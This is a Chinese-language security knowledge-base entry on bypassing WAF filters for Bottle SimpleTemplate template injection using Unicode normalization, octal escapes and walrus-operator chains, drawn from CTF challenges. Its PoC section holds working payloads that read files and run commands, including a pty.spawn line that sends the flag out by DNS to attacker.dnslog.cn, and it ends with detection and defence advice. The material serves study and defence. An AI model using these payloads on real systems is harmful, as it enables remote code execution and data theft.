---
id: web-python-ssti-bottle-unicode-octal-walrus-bypass
title: Bottle SimpleTemplate SSTI：全角/斜体 Unicode、八进制转义与海象运算符绕过 WAF
type: scenario
domain: web
path: web/python/ssti
technique: bottle-ssti-waf-bypass
tags:
- ssti
- python
- bottle
- simpletemplate
- waf-bypass
- unicode
- octal
- walrus
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:20+08:00'
  notes: 已对照原文与 6 张图片核对；未执行 ISCTF/LilCTF/VNCTF 靶场 PoC
url: /docs/web/python/ssti/web-python-ssti-bottle-unicode-octal-walrus-bypass/
draft: false
kb_aliases:
- Bottle SSTI
- SimpleTemplate SSTI
- bottle 模板注入
- 全角 Unicode 绕过 SSTI
- 八进制绕过 SSTI
- 海象运算符 SSTI
- bottle 长度限制绕过
---

## 一句话结论

Bottle 的 SimpleTemplate 直接以 Python 表达式语义执行 `{{ ... }}`，且默认无沙箱；当 WAF 按 ASCII 关键字/符号过滤时，可用全角或数学斜体字母（NFKC 归一化为 ASCII 标识符）、Python 八进制字符串转义（`'\157\163'` → `os`）以及海象运算符分段赋值绕过长度与关键字限制，最终执行 `open/read`、`os.popen` 或反弹命令。

## 原理

Bottle 的 SimpleTemplate（stpl）支持：

- `{{ expr }}`：Python 表达式求值并输出；
- `%` 开头的行：Python 控制语句（`%if`、`%for`、`%import` 等）；
- 模板上下文就是 Python 执行环境，没有严格沙箱，表达式可访问内建函数和对象属性。

因此 `{{__import__('os').popen('id').read()}}` 可直接执行命令。绕过点来自 Python 语言本身：

- **Unicode 标识符归一化**：Python 3 按 PEP 3131 对标识符做 NFKC 归一化，全角 `ｏｐｅｎ`、数学斜体 `𝑖𝑚𝑝𝑜𝑟𝑡` 等会变成 ASCII 的 `open`/`import`。WAF 只匹配 ASCII 时看不到关键字。
- **八进制转义**：Python 字符串里 `'\157\163'` 等于 `'os'`，`'\143\141\164...'` 等于 `cat ...`；WAF 若只查 `os`/`cat` 字面量会漏掉。
- **字符串拼接**：`'op''en'` 在 Python 中自动拼接为 `'open'`，可拆散关键字。
- **海象运算符 + 换行**：`{{a:=''}}` 等分段赋值把长链拆成多个短表达式，绕过长度限制；`%0a` 在模板中是换行，用来分隔多个 `{{ }}`。

## 触发条件

- 应用使用 Bottle `template()`/SimpleTemplate 渲染用户可控内容；
- `{{ }}` 或 `%` 代码进入模板解析（注意：`%` 代码若嵌在普通文本行中且没有换行分隔，会被当作普通文本；`{{ }}` 不受此限制）；
- WAF 仅按 ASCII 关键字/符号过滤，未做 Unicode NFKC 归一化与 Python 转义还原；
- 目标存在可读文件/可执行命令的权限。

## 利用步骤

1. 用 `{{7*7}}` 确认表达式求值；用 `%` 行测试控制语句是否执行。
2. 若关键字被拦，先把字母替换为全角/斜体 Unicode，或把字符串改成八进制转义。
3. 若长度受限，用海象运算符把链拆成多个 `{{ }}`，用 `%0a` 分隔。
4. 若 `open` 被拦，用 `'op''en'` 或全角；若 `__class__` 等被拦，用字符串拼接/Unicode。
5. 回显可用直接输出、`raise Exception(...)` 报错、或 DNS/HTTP 外带。

## PoC

全角绕过（ISCTF 风格，黑名单过滤大部分 ASCII 字母）：

```text
{{ｏｐｅｎ('/flag').ｒｅａｄ()}}
```

八进制绕过：

```text
{{ __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() }}
```

等价于：

```python
{{__import__('os').popen('cat /flag').read()}}
```

单行 `%` 代码 + 报错/DNS（LilCTF 风格，`º` 归一化为 `o`）：

```text
% import ºs
% flag=ºs.pºpen('cat /flag').read()
% raise Exception(flag)
%import pty
%pty.spawn(['/bin/sh', '-c', 'ping -c 1 `cat /flag|base64|tr -d "\n"`.attacker.dnslog.cn'])
```

海象运算符分段（长度限制 + `open`/反斜杠过滤，`%0a` 为换行）：

```text
{{a:=''}}%0a{{b:=a.__class__}}%0a{{c:=b.__base__}}%0a{{d:=c.__subclasses__}}%0a{{e:=d()[156]}}%0a{{f:=e.__init__}}%0a{{g:=f.__globals__}}%0a{{z:='__builtins__'}}%0a{{h:=g[z]}}%0a{{i:=h['op''en']}}%0a{{x:=i("/flag")}}%0a{{y:=x.read()}}
```

## 变体与关联

- Unicode 变体：全角、数学斜体、带圈字母等所有 NFKC 归一化为 ASCII 的字符；可查 Unicode Compart 表挑选。
- 转义变体：八进制、十六进制 `\x6f\x73`、`\N{...}`、字符串拼接。
- 长度变体：海象赋值链、把变量名缩短、用 `%` 控制行分多次执行。
- 模板上下文差异：`bottle.template('hello '+payload)` 中 `%` 代码嵌在文本行内不生效，只能 `{{ }}`；独立行 `%` 才作为代码。
- 关联：Mako SSTI（`${}`/`<% %>`）、Jinja2 SSTI；底层都是“模板表达式等同 Python 代码执行”。

## 检测与防御

- 检测：请求/上传文件中出现 `{{`、`%` 行、`__class__`、`__subclasses__`、`__globals__`、`popen`、`open(`；出现全角字母、数学斜体、八进制转义串、海象运算符。
- 防御：不要渲染用户可控模板；使用 `SimpleTemplate` 时避免把用户输入拼进模板源码；对输入做 NFKC 归一化后再做关键字检测；限制模板内建函数与文件/命令访问；把模板渲染放到低权限沙箱/独立进程。
- 注意：仅过滤 ASCII 关键字不足以阻止 Python 标识符归一化与转义绕过。
